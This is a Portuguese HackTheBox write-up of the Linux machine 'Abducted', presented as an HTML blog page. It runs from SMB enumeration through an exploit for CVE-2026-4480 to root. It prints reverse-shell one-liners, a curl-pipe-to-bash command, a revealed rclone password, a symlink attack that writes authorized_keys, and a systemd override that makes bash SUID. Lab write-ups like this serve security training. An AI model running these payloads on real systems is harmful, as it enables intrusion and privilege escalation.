@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Abducted - HTB // 0x404</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --black: #000408; --panel: #010d1a; --cyan: #00d4ff; --cyan2: #00aacc;
+      --cyan-dim: #004455; --orange: #ff6600; --white: #e0f7ff; --muted: #3a7a8a;
+      --green: #44ff88; --purple: #cc88ff; --red: #ff4466;
+      --ff-title: 'Orbitron', monospace; --ff-mono: 'Share Tech Mono', monospace;
+      --glow-sm: 0 0 8px #00d4ff88; --glow-md: 0 0 16px #00d4ffaa, 0 0 32px #00d4ff44;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--black); color: var(--white); font-family: var(--ff-mono); font-size: 15px; line-height: 1.8; overflow-x: hidden; }
+    .grid-bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; background-image: linear-gradient(var(--cyan-dim) 1px, transparent 1px), linear-gradient(90deg, var(--cyan-dim) 1px, transparent 1px); background-size: 48px 48px; opacity: 0.15; mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 40%, transparent 100%); }
+    .scanlines { position: fixed; inset: 0; z-index: 1; pointer-events: none; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px); }
+    .vignette { position: fixed; inset: 0; z-index: 2; pointer-events: none; background: radial-gradient(ellipse at center, transparent 50%, #000408bb 100%); }
+    nav { position: sticky; top: 0; z-index: 100; border-bottom: 1px solid var(--cyan-dim); background: rgba(0,4,8,0.94); backdrop-filter: blur(12px); }
+    .nav-inner { max-width: 900px; margin: 0 auto; padding: 0 32px; display: flex; align-items: stretch; justify-content: space-between; height: 52px; }
+    .nav-logo { font-family: var(--ff-title); font-size: 14px; font-weight: 700; color: var(--cyan); text-decoration: none; letter-spacing: 0.15em; text-shadow: var(--glow-sm); display: flex; align-items: center; border-right: 1px solid var(--cyan-dim); padding-right: 24px; }
+    .nav-logo .slash { color: var(--orange); }
+    .nav-back { display: flex; align-items: center; gap: 8px; color: var(--muted); text-decoration: none; font-size: 11px; letter-spacing: 0.14em; text-transform: uppercase; transition: color .2s; }
+    .nav-back:hover { color: var(--cyan); }
+    .nav-back::before { content: '←'; font-size: 14px; }
+    .toc-wrap { position: sticky; top: 52px; z-index: 90; background: rgba(0,4,8,0.97); backdrop-filter: blur(12px); border-bottom: 1px solid var(--cyan-dim); border-top: 1px solid var(--cyan-dim); }
+    .toc { max-width: 900px; margin: 0 auto; padding: 10px 32px; display: flex; align-items: center; gap: 20px; }
+    .toc-title { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; color: var(--orange); white-space: nowrap; }
+    .toc ol { list-style: none; counter-reset: toc; display: flex; flex-wrap: wrap; }
+    .toc li { counter-increment: toc; }
+    .toc a { color: var(--muted); text-decoration: none; font-size: 11px; display: flex; align-items: center; gap: 5px; padding: 4px 14px 4px 0; transition: color .2s; white-space: nowrap; }
+    .toc a::before { content: counter(toc, decimal-leading-zero) '.'; font-family: var(--ff-title); font-size: 9px; color: var(--cyan-dim); transition: color .2s; }
+    .toc a:hover { color: var(--cyan2); }
+    .toc a.active { color: var(--cyan); }
+    .toc a.active::before { color: var(--cyan); }
+    .page { position: relative; z-index: 10; max-width: 900px; margin: 0 auto; padding: 0 32px; }
+    .wu-header { padding: 64px 0 48px; border-bottom: 1px solid var(--cyan-dim); margin-bottom: 48px; }
+    .wu-meta { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 20px; }
+    .wu-cat { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; padding: 4px 12px; border: 1px solid; }
+    .cat-infra { border-color: #cc88ff55; color: var(--purple); }
+    .wu-date { font-size: 12px; color: var(--muted); letter-spacing: 0.08em; }
+    .wu-diff { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.12em; padding: 4px 12px; border: 1px solid; }
+    .diff-medium { border-color: #ffaa0055; color: #ffaa00; }
+    .wu-title { font-family: var(--ff-title); font-size: clamp(24px, 4vw, 40px); font-weight: 900; letter-spacing: 0.04em; line-height: 1.2; color: var(--cyan); text-shadow: var(--glow-md); margin-bottom: 16px; }
+    .wu-desc { font-size: 14px; color: var(--muted); max-width: 640px; line-height: 1.8; margin-bottom: 24px; }
+    .wu-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 28px; }
+    .tag { font-size: 11px; color: var(--muted); padding: 3px 10px; border: 1px solid #ffffff0f; background: rgba(255,255,255,0.02); }
+    .wu-infobar { display: flex; flex-wrap: wrap; gap: 2px; border: 1px solid var(--cyan-dim); }
+    .wu-infobar-item { padding: 10px 20px; background: var(--panel); display: flex; flex-direction: column; gap: 2px; flex: 1; min-width: 120px; }
+    .wi-label { font-size: 10px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; }
+    .wi-value { font-family: var(--ff-title); font-size: 13px; font-weight: 700; color: var(--cyan); letter-spacing: 0.06em; }
+    .attack-chain { display: flex; align-items: center; flex-wrap: wrap; gap: 0; margin: 32px 0 48px; }
+    .ac-step { background: var(--panel); border: 1px solid var(--cyan-dim); padding: 10px 14px; font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.06em; color: var(--cyan2); text-align: center; flex: 1; min-width: 80px; line-height: 1.5; }
+    .ac-step.highlight { border-color: var(--orange); color: var(--orange); }
+    .ac-step.pivot { border-color: var(--purple); color: var(--purple); }
+    .ac-arrow { color: var(--cyan-dim); font-size: 16px; padding: 0 2px; flex-shrink: 0; }
+    .wu-content { max-width: 760px; }
+    .wu-content h2 { font-family: var(--ff-title); font-weight: 700; font-size: 17px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--cyan); text-shadow: var(--glow-sm); margin: 56px 0 20px; padding-bottom: 10px; border-bottom: 1px solid var(--cyan-dim); display: flex; align-items: center; gap: 12px; }
+    .wu-content h2::before { content: '//'; color: var(--orange); font-size: 14px; }
+    .wu-content h3 { font-family: var(--ff-title); font-size: 13px; font-weight: 700; letter-spacing: 0.1em; color: var(--cyan2); margin: 32px 0 14px; }
+    .wu-content h3::before { content: '> '; color: var(--muted); }
+    .wu-content p { color: #8ab4be; margin-bottom: 14px; line-height: 1.85; }
+    .wu-content strong { color: var(--white); font-weight: 700; }
+    .wu-content a { color: var(--cyan2); text-decoration: none; }
+    .wu-content a:hover { color: var(--cyan); text-shadow: var(--glow-sm); }
+    .wu-content code { font-family: var(--ff-mono); font-size: 13px; color: var(--orange); background: rgba(255,102,0,0.08); padding: 2px 7px; border: 1px solid rgba(255,102,0,0.2); }
+    .wu-content pre { background: #000d16; border: 1px solid var(--cyan-dim); border-left: 3px solid var(--cyan); margin: 20px 0; overflow-x: auto; }
+    .wu-content pre .lang-label { display: block; padding: 6px 16px; background: var(--panel); border-bottom: 1px solid var(--cyan-dim); font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan2); text-transform: uppercase; }
+    .wu-content pre code { display: block; padding: 18px 20px; background: transparent; border: none; color: #7ecfbf; font-size: 13px; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
+    .wu-content ul { padding-left: 0; margin-bottom: 14px; list-style: none; }
+    .wu-content ul li { color: #8ab4be; padding: 3px 0 3px 22px; position: relative; }
+    .wu-content ul li::before { content: '▸'; position: absolute; left: 0; color: var(--cyan); font-size: 10px; top: 6px; }
+    .wu-content figure { margin: 28px 0; }
+    .wu-content figure img { max-width: 100%; display: block; border: 1px solid var(--cyan-dim); transition: border-color .2s; }
+    .wu-content figure img:hover { border-color: var(--cyan2); }
+    .callout-flag { background: rgba(255,68,102,0.06); border: 1px solid rgba(255,68,102,0.3); border-left: 3px solid var(--red); padding: 16px 20px; margin: 20px 0; }
+    .callout-flag .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--red); margin-bottom: 8px; }
+    .callout-flag p { color: #cc6688; margin: 0; }
+    footer { border-top: 1px solid var(--cyan-dim); padding: 32px 0; margin-top: 40px; display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: var(--muted); letter-spacing: 0.08em; }
+    .status-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); display: inline-block; margin-right: 8px; animation: pulse 2s ease-in-out infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+  </style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+<nav>
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-logo">0x404</a>
+    <a href="../index.html" class="nav-back">Voltar</a>
+  </div>
+</nav>
+<div class="toc-wrap">
+  <nav class="toc">
+    <div class="toc-title">// Índice</div>
+    <ol>
+      <li><a href="#information-gathering">Information Gathering</a></li>
+      <li><a href="#enum-445">Enumeração Porta 445</a></li>
+      <li><a href="#exploracao">Exploração</a></li>
+      <li><a href="#movimentacao">Movimentação Lateral</a></li>
+      <li><a href="#elevacao">Elevação de Privilégios</a></li>
+    </ol>
+  </nav>
+</div>
+<div class="page">
+  <header class="wu-header">
+    <div class="wu-meta">
+      <span class="wu-cat cat-infra">Infrastructure</span>
+      <span class="wu-date">SET 2026</span>
+      <span class="wu-diff diff-medium">MEDIUM</span>
+    </div>
+    <h1 class="wu-title">Abducted — HTB</h1>
+    <p class="wu-desc">
+      CVE-2026-4480 no serviço de impressão SMB permite RCE como nobody. Credenciais ofuscadas do rclone reveladas
+      em texto claro permitem acesso como scott. Symlink attack via Samba wide links para escrita em authorized_keys
+      do marcus. Escalada via systemd override no smbd com SUID bash via Polkit.
+    </p>
+    <div class="wu-tags">
+      <span class="tag">CVE-2026-4480</span>
+      <span class="tag">SMB</span>
+      <span class="tag">RCE</span>
+      <span class="tag">rclone</span>
+      <span class="tag">Wide Links</span>
+      <span class="tag">Symlink Attack</span>
+      <span class="tag">systemd Override</span>
+      <span class="tag">Polkit</span>
+      <span class="tag">SUID</span>
+    </div>
+    <div class="wu-infobar">
+      <div class="wu-infobar-item"><span class="wi-label">Plataforma</span><span class="wi-value">HackTheBox</span></div>
+      <div class="wu-infobar-item"><span class="wi-label">OS</span><span class="wi-value">Linux</span></div>
+      <div class="wu-infobar-item"><span class="wi-label">Dificuldade</span><span class="wi-value" style="color:#ffaa00">Medium</span></div>
+      <div class="wu-infobar-item"><span class="wi-label">IP Alvo</span><span class="wi-value">10.129.244.177</span></div>
+      <div class="wu-infobar-item"><span class="wi-label">Data</span><span class="wi-value">05 SET 2026</span></div>
+    </div>
+  </header>
+  <div class="attack-chain">
+    <div class="ac-step">CVE-2026-4480<br>RCE (nobody)</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">rclone.conf<br>senha ofuscada</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step pivot">scott<br>rclone reveal</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">Wide Links<br>Symlink Attack</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">marcus<br>SSH key</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step highlight">root<br>systemd + Polkit</div>
+  </div>
+  <div class="wu-content">
+
+    <figure><img src="imgs/capa-0x404-notion.png" alt="Capa" /></figure>
+    <figure><img src="imgs/a1f1a05f-5c5d-4cca-8103-cf875d8e5698-1780591497.png" alt="" /></figure>
+    <p>Escopo: 10.129.244.177</p>
+
+    <h2 id="information-gathering">Information Gathering</h2>
+    <p>Iniciaremos este projeto com a fase de reconhecimento, realizando a coleta de informações sobre o ambiente alvo.</p>
+
+    <h3 id="portscan">Portscan</h3>
+    <p>Realizaremos a enumeração de portas para identificar serviços ativos e expostos no ambiente alvo.</p>
+    <pre><span class="lang-label">bash</span><code>$ enumport 10.129.244.177
+Enumerando portas....
+Portas abertas: 22,139,445
+Verificando Serviços
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-05 10:11 -0300
+Nmap scan report for 10.129.244.177
+Host is up (0.16s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+139/tcp open  netbios-ssn Samba smbd 4
+445/tcp open  netbios-ssn Samba smbd 4
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_clock-skew: 1s
+| smb2-time: 
+|   date: 2026-09-05T13:11:42
+|_  start_date: N/A
+|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.77 seconds</code></pre>
+    <p>Obs: Para enumeração de portas e serviços utilizamos o script personalizado juntamente com Nmap: <a href="https://github.com/fstringuetta/enumport" target="_blank">https://github.com/fstringuetta/enumport</a></p>
+
+    <h3 id="enum-445">Enumeração Porta 445</h3>
+    <p>Realizamos um teste de <code>Null Session</code> via SMB para verificar se é possível listar compartilhamentos sem autenticação.</p>
+    <pre><span class="lang-label">bash</span><code>$ netexec smb 10.129.244.177 -u '' -p '' --shares</code></pre>
+    <figure><img src="imgs/2026-09-05_10-20.png" alt="netexec listando compartilhamentos via null session" /></figure>
+    <p>A partir dessa informação, realizamos uma pesquisa por vulnerabilidades conhecidas relacionadas ao serviço SMB e ao componente de impressão <code>HP-Reception</code> identificado. Durante a investigação, encontramos uma possível vulnerabilidade catalogada como CVE-2026-4480, que poderia permitir injeção e execução de comandos.</p>
+    <figure><img src="imgs/2026-09-05_10-23.png" alt="CVE-2026-4480 identificada" /></figure>
+    <p>Link referência: <a href="https://www.sentinelone.com/vulnerability-database/cve-2026-4480/" target="_blank">https://www.sentinelone.com/vulnerability-database/cve-2026-4480/</a></p>
+
+    <h3 id="exploracao">Exploração</h3>
+    <p>Com a possível vulnerabilidade associada ao serviço já identificada, realizamos uma busca por exploits públicos relacionados à CVE-2026-4480. Após localizar uma implementação compatível com o cenário observado, efetuamos o download do exploit para o host local, a fim de realizar a prova de conceito (PoC).</p>
+    <pre><span class="lang-label">bash</span><code>$ python3 exploit.py 10.129.244.177 10.10.15.177 4444 -c 'ping -c2 10.10.15.177'</code></pre>
+    <figure><img src="imgs/2026-09-05_10-31.png" alt="PoC confirmando RCE via ICMP" /></figure>
+    <p>A prova de conceito foi executada com sucesso, confirmando a execução remota de comandos por meio do envio de pacotes ICMP do servidor alvo para o nosso host local.</p>
+    <p>Com a vulnerabilidade validada, o próximo passo consistiu em estabelecer uma conexão reversa (reverse shell) com o alvo. Para isso, utilizamos o reverse-shell.sh para gerar o payload que seria utilizado na obtenção do acesso inicial ao sistema.</p>
+    <pre><span class="lang-label">bash</span><code># Reverse Shell as a Service
+# https://github.com/lukechilds/reverse-shell
+#
+# 1. On your machine:
+#      nc -l 1337
+#
+# 2. On the target machine:
+#      curl https://reverse-shell.sh/yourip:1337 | sh
+#
+# 3. Don't be a dick
+
+if command -v python &gt; /dev/null 2&gt;&amp;1; then
+	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.15.177",9001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+	exit;
+fi
+
+if command -v perl &gt; /dev/null 2&gt;&amp;1; then
+	perl -e 'use Socket;$i="10.10.15.177";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+	exit;
+fi
+
+if command -v nc &gt; /dev/null 2&gt;&amp;1; then
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.177 9001 &gt;/tmp/f
+	exit;
+fi
+
+if command -v sh &gt; /dev/null 2&gt;&amp;1; then
+	/bin/sh -i &gt;&amp; /dev/tcp/10.10.15.177/9001 0&gt;&amp;1
+	exit;
+fi</code></pre>
+    <p>Assim que criamos nossa payload realizamos a execução do exploit.</p>
+    <pre><span class="lang-label">bash</span><code>$ python3 exploit.py 10.129.244.177 10.10.15.177 4444 -c 'curl 10.10.15.177/shell|bash'</code></pre>
+    <figure><img src="imgs/2026-09-05_10-38.png" alt="Reverse shell recebida como nobody" /></figure>
+    <p>Com acesso ao sistema, identificamos os usuários <code>scott</code> e <code>marcus</code> presentes no ambiente, porém sem permissão de acesso aos seus respectivos diretórios.</p>
+    <pre><span class="lang-label">bash</span><code>nobody@abducted:/home$ cd marcus/
+bash: cd: marcus/: Permission denied
+
+nobody@abducted:/home$ cd scott/
+bash: cd: scott/: Permission denied</code></pre>
+
+    <h3 id="movimentacao">Movimentação Lateral</h3>
+    <p>Durante a enumeração do sistema, identificamos a presença do utilitário <code>rclone</code> e localizamos seu arquivo de configuração em <code>/opt/offsite-backup</code>.</p>
+    <pre><span class="lang-label">bash</span><code>nobody@abducted:/opt/offsite-backup$ cat rclone.conf 
+[offsite]
+type = sftp
+host = backup.hartley-group.internal
+user = svc-backup
+pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+shell_type = unix</code></pre>
+    <p>A senha armazenada no arquivo de configuração estava no formato ofuscado do <code>rclone</code>. Utilizamos o comando <code>rclone reveal</code> para obter a senha em texto claro.</p>
+    <pre><span class="lang-label">bash</span><code>$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+iXzvcib3SrpZ</code></pre>
+    <p>Agora que temos a senha em texto claro podemos validar se ela está também associada a um dos usuários existentes no sistema operacional.</p>
+    <pre><span class="lang-label">bash</span><code>nobody@abducted:/opt/offsite-backup$ su - scott 
+Password: 
+scott@abducted:~$ id
+uid=1000(scott) gid=1001(scott) groups=1001(scott)</code></pre>
+    <figure><img src="imgs/2026-09-05_10-49.png" alt="Acesso obtido como scott com a senha do rclone" /></figure>
+
+    <h3 id="elevacao">Elevação de Privilégios</h3>
+    <p>Para dar continuidade ao processo de pós-exploração, tornou-se necessário identificar um caminho para elevação de privilégios até o usuário root.</p>
+    <p>Durante a enumeração identificamos o compartilhamento <code>transfer</code> com a opção <code>wide links</code> habilitada no Samba.</p>
+    <pre><span class="lang-label">bash</span><code>[transfer]
+   comment = Staff file transfer
+   path = /srv/transfer
+   valid users = scott
+   force user = marcus
+   read only = no
+   wide links = yes
+   browseable = yes</code></pre>
+    <p>A opção <code>wide links = yes</code> permite que o Samba siga links simbólicos para fora do diretório compartilhado. Como o compartilhamento é executado com <code>force user = marcus</code>, é possível criar um symlink apontando para o diretório home de <code>marcus</code> e, por meio do SMB, escrever arquivos nele — incluindo <code>authorized_keys</code>.</p>
+    <pre><span class="lang-label">bash</span><code>scott@abducted:~$ ln -s /home/marcus /srv/transfer/mc
+scott@abducted:~$ ssh-keygen -q -t ed25519 -N '' -f /tmp/rsa
+scott@abducted:~$ smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ'
+Try "help" to get a list of possible commands.
+smb: \&gt; mkdir mc/.ssh
+smb: \&gt; put /tmp/rsa.pub mc/.ssh/authorized_keys
+putting file /tmp/rsa.pub as \mc\.ssh\authorized_keys (18.7 kb/s) (average 18.8 kb/s)</code></pre>
+    <p>Executados os passos acima podemos nos autenticar via SSH com usuário marcus utilizando a nossa chave privada.</p>
+    <pre><span class="lang-label">bash</span><code>scott@abducted:~$ ssh -i /tmp/rsa marcus@127.0.0.1</code></pre>
+    <figure><img src="imgs/2026-09-05_11-12.png" alt="Acesso SSH obtido como marcus" /></figure>
+    <p>Com acesso como <code>marcus</code>, verificamos que ele pertence ao grupo <code>operators</code>. Realizamos a enumeração de diretórios graváveis associados a esse grupo.</p>
+    <pre><span class="lang-label">bash</span><code>marcus@abducted:~$ find / -writable -group operators -type d 2&gt;/dev/null
+/etc/systemd/system/smbd.service.d</code></pre>
+    <p>O diretório <code>/etc/systemd/system/smbd.service.d</code> é gravável pelo grupo <code>operators</code>. Verificamos também que <code>marcus</code> possui permissão via <code>Polkit</code> para realizar o reload de serviços systemd.</p>
+    <pre><span class="lang-label">bash</span><code>marcus@abducted:~$ pkaction | grep reload
+org.freedesktop.network1.reload
+org.freedesktop.systemd1.reload-daemon</code></pre>
+    <p>Com base nas permissões identificadas anteriormente, verificamos que seria possível combinar a permissão de escrita sobre os arquivos relacionados ao serviço smbd com a capacidade de realizar seu reload via Polkit, criando um possível vetor para elevação de privilégios.</p>
+    <p>Criamos o arquivo <code>privesc.conf</code> em <code>/etc/systemd/system/smbd.service.d/</code> com o seguinte conteúdo:</p>
+    <pre><span class="lang-label">ini</span><code>[Service]
+ExecStartPre=/bin/bash -c "chmod +s /bin/bash"</code></pre>
+    <figure><img src="imgs/2026-09-05_11-27.png" alt="Override malicioso criado no diretório do serviço smbd" /></figure>
+    <p>Após a criação do override malicioso e a configuração das diretivas necessárias, o próximo passo consistiu em aplicar as alterações realizadas. Para isso, efetuamos o reload das configurações do systemd e, posteriormente, o reinício do serviço smbd, fazendo com que a configuração adicionada anteriormente fosse executada com privilégios de root.</p>
+    <p>Os comandos utilizados para essa etapa são apresentados abaixo:</p>
+    <pre><span class="lang-label">bash</span><code>marcus@abducted:~$ systemctl daemon-reload
+marcus@abducted:~$ systemctl restart smbd</code></pre>
+    <p>Verificamos que o SUID foi aplicado com sucesso ao <code>/bin/bash</code>.</p>
+    <pre><span class="lang-label">bash</span><code>marcus@abducted:~$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash</code></pre>
+    <p>Como o arquivo pertence ao usuário root, essa condição permitiu executar o binário preservando os privilégios de seu proprietário, concluindo o processo de elevação de privilégios para root e obtendo nossa segunda evidência de acesso.</p>
+    <pre><span class="lang-label">bash</span><code>marcus@abducted:~$ /bin/bash -p
+bash-5.2# id 
+uid=1001(marcus) gid=1002(marcus) euid=0(root) egid=0(root) groups=0(root),1000(operators),1002(marcus)</code></pre>
+    <figure><img src="imgs/2026-09-05_11-35.png" alt="Root obtido via /bin/bash -p" /></figure>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Flag 1 — User Flag</div>
+      <p>Obtida no diretório do usuário <code>scott</code> após movimentação lateral via rclone credentials</p>
+    </div>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Flag 2 — Root Flag</div>
+      <p>Obtida após escalada via systemd override + Polkit reload do smbd com SUID em <code>/bin/bash</code></p>
+    </div>
+
+  </div>
+  <footer>
+    <div><span class="status-dot"></span>fstringuetta.github.io</div>
+    <span>© 2026 · fstringuetta</span>
+  </footer>
+</div>
+<script>
+  const sections = document.querySelectorAll('.wu-content h2[id], .wu-content h3[id]');
+  const tocLinks = document.querySelectorAll('.toc a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(l => l.classList.remove('active'));
+        const active = document.querySelector(`.toc a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-10% 0px -80% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+  document.addEventListener('mousemove', e => {
+    const x = (e.clientX / window.innerWidth - 0.5) * 14;
+    const y = (e.clientY / window.innerHeight - 0.5) * 14;
+    document.querySelector('.grid-bg').style.transform = `translate(${x}px, ${y}px)`;
+  });
+</script>
+</body>
+</html>
